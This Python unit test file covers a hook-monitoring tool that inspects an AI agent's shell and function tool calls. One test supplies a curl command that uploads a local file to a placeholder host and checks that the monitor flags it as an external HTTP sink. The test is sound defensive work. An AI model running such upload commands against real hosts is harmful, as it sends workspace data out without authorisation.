from __future__ import annotations

import json
import tempfile
import unittest
from pathlib import Path

from hook_monitor.analysis.adapters.registry import run_adapters
from hook_monitor.runtime.models import ArtifactContext
from hook_monitor.runtime.operations import extract_tool_operations
from hook_monitor.runtime.parser import (
    build_artifacts,
    build_fragments,
    normalize_event,
)
from hook_monitor.runtime.pre_tool_policy import pre_tool_adapter
from hook_monitor.runtime.tool_compat import shell_command_from_input
from scripts.manual_desktop_phase_b import (
    CONTEXT_FILENAME,
    PROMPT_FILENAME,
    _write_desktop_guidance,
)


class DesktopToolCompatibilityTest(unittest.TestCase):
    def test_plugin_hooks_match_canonical_bash_hook_name(self) -> None:
        manifest = json.loads(
            (Path(__file__).parents[1] / "hooks" / "hooks.json").read_text(
                encoding="utf-8"
            )
        )

        for phase in ("PreToolUse", "PostToolUse"):
            matcher = manifest["hooks"][phase][0]["matcher"]
            self.assertEqual("^.*$", matcher)
            self.assertNotIn("exec_command", matcher)

    def test_exec_command_uses_cmd_without_rewriting_raw_payload(self) -> None:
        tool_input = {
            "cmd": "printf public",
            "workdir": "/tmp/workspace",
            "yield_time_ms": 10_000,
        }

        self.assertEqual(
            "printf public",
            shell_command_from_input("exec_command", tool_input),
        )
        self.assertEqual("bash", pre_tool_adapter("exec_command"))
        self.assertNotIn("command", tool_input)

    def test_other_local_function_tools_use_conservative_adapter(self) -> None:
        self.assertEqual("function", pre_tool_adapter("update_plan"))
        self.assertEqual("function", pre_tool_adapter("spawn_agent"))
        self.assertIsNone(pre_tool_adapter("apply_patch"))

    def test_canonical_bash_hook_payload_uses_command_field(self) -> None:
        self.assertEqual(
            "printf cli",
            shell_command_from_input(
                "Bash",
                {"command": "printf cli", "cmd": "ignored"},
            ),
        )
        self.assertEqual("bash", pre_tool_adapter("Bash"))

    def test_exec_command_builds_bash_operation_and_http_sink(self) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            workspace = Path(temporary_directory).resolve()
            command = (
                "curl --data-binary @desktop-public.txt "
                "https://example.invalid"
            )
            payload = {
                "session_id": "desktop-session",
                "turn_id": "desktop-turn",
                "tool_use_id": "desktop-call",
                "tool_name": "exec_command",
                "tool_input": {
                    "cmd": command,
                    "workdir": str(workspace),
                    "yield_time_ms": 10_000,
                },
                "cwd": str(workspace),
            }
            event = normalize_event(
                "pre_tool_use",
                payload,
                workspace_root=str(workspace),
            )
            artifacts = build_artifacts(event)
            fragments = build_fragments(artifacts)
            extraction = extract_tool_operations(
                event,
                artifacts,
                fragments,
            )
            fragments.extend(extraction.fragments)
            contexts = [
                ArtifactContext(
                    fragment=fragment,
                    artifact_role="tool_input",
                    event_id=event.event_id,
                    phase=event.phase,
                    session_id=event.session_id,
                    turn_id=event.turn_id,
                    tool_use_id=event.tool_use_id,
                    tool_name=event.tool_name,
                    cwd=event.cwd,
                    sequence_no=1,
                    workspace_id=event.workspace_id,
                    workspace_root=event.workspace_root,
                    workspace_lexical_root=event.workspace_lexical_root,
                    workspace_execution_cwd=event.workspace_execution_cwd,
                    workspace_status=event.workspace_status,
                )
                for fragment in fragments
            ]

            self.assertTrue(
                any(
                    fragment.fragment_kind == "bash_segment"
                    and fragment.text == command
                    for fragment in extraction.fragments
                )
            )
            result = run_adapters(
                contexts,
                workspace,
                operations=extraction.operations,
            )
            self.assertEqual(
                ["external_http_request"],
                [sink.sink_type for sink in result.sinks],
            )

    def test_desktop_context_uses_active_hook_plugin_root(self) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            root = Path(temporary_directory)
            installed_root = root / "marketplace" / "tooluseproxy"
            hook_root = root / "codex-home" / "plugins" / "cache" / "plugin"
            plugin_data = (
                root / "codex-home" / "plugins" / "data" / "tooluseproxy"
            )
            state = {
                "workspace": str(root / "workspace"),
                "installed_plugin_root": str(installed_root),
                "hook_plugin_root": str(hook_root),
                "plugin_data": str(plugin_data),
                "fake_sink": str(root / "bin" / "curl"),
                "plugin_version": "0.1.0-alpha.3",
            }

            _write_desktop_guidance(root, state)

            context = json.loads(
                (root / CONTEXT_FILENAME).read_text(encoding="utf-8")
            )
            self.assertEqual(
                str(
                    hook_root
                    / "skills"
                    / "tooluseproxy-setup"
                    / "SKILL.md"
                ),
                context["setup_skill"],
            )
            self.assertEqual(str(hook_root), context["plugin_root"])
            self.assertEqual(str(plugin_data), context["plugin_data"])
            prompt = (root / PROMPT_FILENAME).read_text(encoding="utf-8")
            self.assertIn("setup_skill", prompt)
            self.assertIn("contextに記録された", prompt)

    def test_setup_skill_uses_phase_b_plugin_identity(self) -> None:
        skill = (
            Path(__file__).parents[1]
            / "skills"
            / "tooluseproxy-setup"
            / "SKILL.md"
        ).read_text(encoding="utf-8")

        self.assertIn("expected_plugin_id", skill)
        self.assertIn("Plugin - <expected_plugin_id>", skill)
        self.assertIn(
            "never replace\nthat context-specific ID",
            skill,
        )


if __name__ == "__main__":
    unittest.main()
